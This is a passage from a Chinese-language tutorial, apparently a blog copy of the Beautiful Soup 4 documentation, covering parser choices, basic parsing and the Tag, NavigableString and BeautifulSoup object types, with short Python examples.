&lt;p&gt;另一个可供选择的解析器是纯Python实现的 &lt;a href=&quot;http://code.google.com/p/html5lib/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;html5lib&lt;/a&gt; , html5lib的解析方式与浏览器相同,可以选择下列方法来安装html5lib:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ apt-get install Python-html5lib&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ easy_install html5lib&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ pip install html5lib&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;下表列出了主要的解析器,以及它们的优缺点:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;解析器&lt;/th&gt;
&lt;th&gt;使用方法&lt;/th&gt;
&lt;th&gt;优势&lt;/th&gt;
&lt;th&gt;劣势&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Python标准库&lt;/td&gt;
&lt;td&gt;&lt;code&gt;BeautifulSoup(markup, &amp;quot;html.parser&amp;quot;)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Python的内置标准库、执行速度适中、文档容错能力强&lt;/td&gt;
&lt;td&gt;Python 2.7.3 or 3.2.2)前 的版本中文档容错能力差&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;lxml HTML 解析器&lt;/td&gt;
&lt;td&gt;&lt;code&gt;BeautifulSoup(markup, &amp;quot;lxml&amp;quot;)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;速度快、文档容错能力强&lt;/td&gt;
&lt;td&gt;需要安装C语言库&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;lxml XML 解析器&lt;/td&gt;
&lt;td&gt;&lt;code&gt;BeautifulSoup(markup, [&amp;quot;lxml&amp;quot;, &amp;quot;xml&amp;quot;])&lt;/code&gt; &lt;code&gt;BeautifulSoup(markup, &amp;quot;xml&amp;quot;)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;速度快、唯一支持XML的解析器&lt;/td&gt;
&lt;td&gt;需要安装C语言库&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;html5lib&lt;/td&gt;
&lt;td&gt;&lt;code&gt;BeautifulSoup(markup, &amp;quot;html5lib&amp;quot;)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;最好的容错性、以浏览器的方式解析文档、生成HTML5格式的文档&lt;/td&gt;
&lt;td&gt;速度慢、不依赖外部扩展&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;推荐使用lxml作为解析器,因为效率更高. 在Python2.7.3之前的版本和Python3中3.2.2之前的版本,必须安装lxml或html5lib, 因为那些Python版本的标准库中内置的HTML解析方法不够稳定.&lt;/p&gt;
&lt;p&gt;提示: 如果一段HTML或XML文档格式不正确的话,那么在不同的解析器中返回的结果可能是不一样的,查看 &lt;a href=&quot;#id49&quot;&gt;解析器之间的区别&lt;/a&gt; 了解更多细节&lt;/p&gt;
&lt;h1 id=&quot;如何使用&quot;&gt;&lt;a href=&quot;#如何使用&quot; class=&quot;headerlink&quot; title=&quot;如何使用&quot;&gt;&lt;/a&gt;如何使用&lt;/h1&gt;&lt;p&gt;将一段文档传入BeautifulSoup 的构造方法,就能得到一个文档的对象, 可以传入一段字符串或一个文件句柄.&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;from bs4 import BeautifulSoup&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(open(&amp;quot;index.html&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(&amp;quot;&amp;lt;html&amp;gt;data&amp;lt;/html&amp;gt;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;首先,文档被转换成Unicode,并且HTML的实例都被转换成Unicode编码&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;BeautifulSoup(&amp;quot;Sacr&amp;amp;eacute; bleu!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;Sacré bleu!&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后,Beautiful Soup选择最合适的解析器来解析这段文档,如果手动指定解析器那么Beautiful Soup会选择指定的解析器来解析文档.(参考 &lt;a href=&quot;#xml&quot;&gt;解析成XML&lt;/a&gt; ).&lt;/p&gt;
&lt;h1 id=&quot;对象的种类&quot;&gt;&lt;a href=&quot;#对象的种类&quot; class=&quot;headerlink&quot; title=&quot;对象的种类&quot;&gt;&lt;/a&gt;对象的种类&lt;/h1&gt;&lt;p&gt;Beautiful Soup将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象,所有对象可以归纳为4种: &lt;code&gt;Tag&lt;/code&gt; , &lt;code&gt;NavigableString&lt;/code&gt; , &lt;code&gt;BeautifulSoup&lt;/code&gt; , &lt;code&gt;Comment&lt;/code&gt; .&lt;/p&gt;
&lt;h2 id=&quot;Tag&quot;&gt;&lt;a href=&quot;#Tag&quot; class=&quot;headerlink&quot; title=&quot;Tag&quot;&gt;&lt;/a&gt;Tag&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Tag&lt;/code&gt; 对象与XML或HTML原生文档中的tag相同:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(&amp;apos;&amp;lt;b class=&amp;quot;boldest&amp;quot;&amp;gt;Extremely bold&amp;lt;/b&amp;gt;&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag = soup.b&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;type(tag)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;class &amp;apos;bs4.element.Tag&amp;apos;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Tag有很多方法和属性,在 &lt;a href=&quot;#id15&quot;&gt;遍历文档树&lt;/a&gt; 和 &lt;a href=&quot;#id24&quot;&gt;搜索文档树&lt;/a&gt; 中有详细解释.现在介绍一下tag中最重要的属性: name和attributes&lt;/p&gt;
&lt;h3 id=&quot;Name&quot;&gt;&lt;a href=&quot;#Name&quot; class=&quot;headerlink&quot; title=&quot;Name&quot;&gt;&lt;/a&gt;Name&lt;/h3&gt;&lt;p&gt;每个tag都有自己的名字,通过 &lt;code&gt;.name&lt;/code&gt; 来获取:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;tag.name&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;b&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果改变了tag的name,那将影响所有通过当前Beautiful Soup对象生成的HTML文档:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;tag.name = &amp;quot;blockquote&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;blockquote class=&amp;quot;boldest&amp;quot;&amp;gt;Extremely bold&amp;lt;/blockquote&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;Attributes&quot;&gt;&lt;a href=&quot;#Attributes&quot; class=&quot;headerlink&quot; title=&quot;Attributes&quot;&gt;&lt;/a&gt;Attributes&lt;/h3&gt;&lt;p&gt;一个tag可能有很多个属性. tag &lt;code&gt;&amp;lt;b class=&amp;quot;boldest&amp;quot;&amp;gt;&lt;/code&gt; 有一个 “class” 的属性,值为 “boldest” . tag的属性的操作方法与字典相同:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;tag[&amp;apos;class&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;boldest&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;也可以直接”点”取属性, 比如: &lt;code&gt;.attrs&lt;/code&gt; :&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;tag.attrs&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;#123;u&amp;apos;class&amp;apos;: u&amp;apos;boldest&amp;apos;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;tag的属性可以被添加,删除或修改. 再说一次, tag的属性操作方法与字典一样&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;tag[&amp;apos;class&amp;apos;] = &amp;apos;verybold&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag[&amp;apos;id&amp;apos;] = 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;blockquote class=&amp;quot;verybold&amp;quot; id=&amp;quot;1&amp;quot;&amp;gt;Extremely bold&amp;lt;/blockquote&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;del tag[&amp;apos;class&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;del tag[&amp;apos;id&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;blockquote&amp;gt;Extremely bold&amp;lt;/blockquote&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag[&amp;apos;class&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# KeyError: &amp;apos;class&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(tag.get(&amp;apos;class&amp;apos;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# None&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;多值属性&quot;&gt;&lt;a href=&quot;#多值属性&quot; class=&quot;headerlink&quot; title=&quot;多值属性&quot;&gt;&lt;/a&gt;多值属性&lt;/h4&gt;&lt;p&gt;HTML 4定义了一系列可以包含多个值的属性.在HTML5中移除了一些,却增加更多.最常见的多值的属性是 class (一个tag可以有多个CSS的class). 还有一些属性 &lt;code&gt;rel&lt;/code&gt; , &lt;code&gt;rev&lt;/code&gt; , &lt;code&gt;accept-charset&lt;/code&gt; , &lt;code&gt;headers&lt;/code&gt; , &lt;code&gt;accesskey&lt;/code&gt; . 在Beautiful Soup中多值属性的返回类型是list:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;css_soup = BeautifulSoup(&amp;apos;&amp;lt;p class=&amp;quot;body strikeout&amp;quot;&amp;gt;&amp;lt;/p&amp;gt;&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;css_soup.p[&amp;apos;class&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;quot;body&amp;quot;, &amp;quot;strikeout&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;css_soup = BeautifulSoup(&amp;apos;&amp;lt;p class=&amp;quot;body&amp;quot;&amp;gt;&amp;lt;/p&amp;gt;&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;css_soup.p[&amp;apos;class&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;quot;body&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果某个属性看起来好像有多个值,但在任何版本的HTML定义中都没有被定义为多值属性,那么Beautiful Soup会将这个属性作为字符串返回&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;id_soup = BeautifulSoup(&amp;apos;&amp;lt;p id=&amp;quot;my id&amp;quot;&amp;gt;&amp;lt;/p&amp;gt;&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;id_soup.p[&amp;apos;id&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;apos;my id&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;将tag转换成字符串时,多值属性会合并为一个值&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;rel_soup = BeautifulSoup(&amp;apos;&amp;lt;p&amp;gt;Back to the &amp;lt;a rel=&amp;quot;index&amp;quot;&amp;gt;homepage&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rel_soup.a[&amp;apos;rel&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;apos;index&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rel_soup.a[&amp;apos;rel&amp;apos;] = [&amp;apos;index&amp;apos;, &amp;apos;contents&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(rel_soup.p)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;p&amp;gt;Back to the &amp;lt;a rel=&amp;quot;index contents&amp;quot;&amp;gt;homepage&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果转换的文档是XML格式,那么tag中不包含多值属性&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;xml_soup = BeautifulSoup(&amp;apos;&amp;lt;p class=&amp;quot;body strikeout&amp;quot;&amp;gt;&amp;lt;/p&amp;gt;&amp;apos;, &amp;apos;xml&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xml_soup.p[&amp;apos;class&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;body strikeout&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;可以遍历的字符串&quot;&gt;&lt;a href=&quot;#可以遍历的字符串&quot; class=&quot;headerlink&quot; title=&quot;可以遍历的字符串&quot;&gt;&lt;/a&gt;可以遍历的字符串&lt;/h2&gt;&lt;p&gt;字符串常被包含在tag内.Beautiful Soup用 &lt;code&gt;NavigableString&lt;/code&gt; 类来包装tag中的字符串:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;tag.string&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;Extremely bold&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;type(tag.string)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;class &amp;apos;bs4.element.NavigableString&amp;apos;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;一个 &lt;code&gt;NavigableString&lt;/code&gt; 字符串与Python中的Unicode字符串相同,并且还支持包含在 &lt;a href=&quot;#id15&quot;&gt;遍历文档树&lt;/a&gt; 和 &lt;a href=&quot;#id24&quot;&gt;搜索文档树&lt;/a&gt; 中的一些特性. 通过 &lt;code&gt;unicode()&lt;/code&gt; 方法可以直接将 &lt;code&gt;NavigableString&lt;/code&gt; 对象转换成Unicode字符串:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;unicode_string = unicode(tag.string)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;unicode_string&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;Extremely bold&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;type(unicode_string)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;type &amp;apos;unicode&amp;apos;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;tag中包含的字符串不能编辑,但是可以被替换成其它的字符串,用 &lt;a href=&quot;#replace-with&quot;&gt;replace_with()&lt;/a&gt; 方法:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;tag.string.replace_with(&amp;quot;No longer bold&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;blockquote&amp;gt;No longer bold&amp;lt;/blockquote&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;NavigableString&lt;/code&gt; 对象支持 &lt;a href=&quot;#id15&quot;&gt;遍历文档树&lt;/a&gt; 和 &lt;a href=&quot;#id24&quot;&gt;搜索文档树&lt;/a&gt; 中定义的大部分属性, 并非全部.尤其是,一个字符串不能包含其它内容(tag能够包含字符串或是其它tag),字符串不支持 &lt;code&gt;.contents&lt;/code&gt; 或 &lt;code&gt;.string&lt;/code&gt; 属性或 &lt;code&gt;find()&lt;/code&gt; 方法.&lt;/p&gt;
&lt;p&gt;如果想在Beautiful Soup之外使用 &lt;code&gt;NavigableString&lt;/code&gt; 对象,需要调用 &lt;code&gt;unicode()&lt;/code&gt; 方法,将该对象转换成普通的Unicode字符串,否则就算Beautiful Soup已方法已经执行结束,该对象的输出也会带有对象的引用地址.这样会浪费内存.&lt;/p&gt;
&lt;h2 id=&quot;BeautifulSoup&quot;&gt;&lt;a href=&quot;#BeautifulSoup&quot; class=&quot;headerlink&quot; title=&quot;BeautifulSoup&quot;&gt;&lt;/a&gt;BeautifulSoup&lt;/h2&gt;&lt;p&gt;&lt;code&gt;BeautifulSoup&lt;/code&gt; 对象表示的是一个文档的全部内容.大部分时候,可以把它当作 &lt;code&gt;Tag&lt;/code&gt; 对象,它支持 &lt;a href=&quot;#id15&quot;&gt;遍历文档树&lt;/a&gt; 和 &lt;a href=&quot;#id24&quot;&gt;搜索文档树&lt;/a&gt; 中描述的大部分的方法.&lt;/p&gt;
&lt;p&gt;因为 &lt;code&gt;BeautifulSoup&lt;/code&gt; 对象并不是真正的HTML或XML的tag,所以它没有name和attribute属性.但有时查看它的 &lt;code&gt;.name&lt;/code&gt; 属性是很方便的,所以 &lt;code&gt;BeautifulSoup&lt;/code&gt; 对象包含了一个值为 “[document]” 的特殊属性 &lt;code&gt;.name&lt;/code&gt;&lt;/p&gt;
